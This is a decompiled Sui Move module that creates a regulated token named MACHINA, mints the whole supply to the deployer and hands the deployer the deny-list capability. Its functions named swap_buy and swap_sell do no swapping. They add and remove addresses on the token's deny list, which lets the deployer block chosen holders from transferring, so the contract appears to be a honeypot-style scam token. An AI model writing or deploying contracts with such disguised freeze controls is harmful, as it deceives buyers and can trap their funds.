module 0xd359e8b43befc23d218c15c2c0a76902d71f4852016105677cc878a951215956::machina {
    struct MACHINA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MACHINA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MACHINA>(arg0, 9, b"machina", b"dolor machina", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://gateway.irys.xyz/vXUsbmYgyo4bo5zh2qMycXhIHHNmhwboLaS6myWMVbU"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MACHINA>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MACHINA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MACHINA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MACHINA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MACHINA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MACHINA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MACHINA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MACHINA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

